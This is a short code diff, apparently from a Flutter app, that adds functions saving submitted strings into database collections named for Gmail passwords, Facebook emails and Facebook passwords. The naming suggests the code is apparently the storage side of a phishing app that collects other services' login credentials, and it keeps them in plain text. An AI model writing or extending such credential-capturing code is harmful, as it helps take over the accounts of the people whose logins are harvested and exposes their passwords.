@@ -7,5 +7,13 @@ Future<void> addData(String data) async {
 }
 
 Future<void> addData2(String data) async {
-  await db.collection('Password').add({'password': data});
+  await db.collection('GmailPassword').add({'gmailpassword': data});
+}
+
+Future<void> addData3(String data) async {
+  await db.collection('Facebook').add({'email2': data});
+}
+
+Future<void> addData4(String data) async {
+  await db.collection('FacebookPassword').add({'gmailpassword2': data});
 }
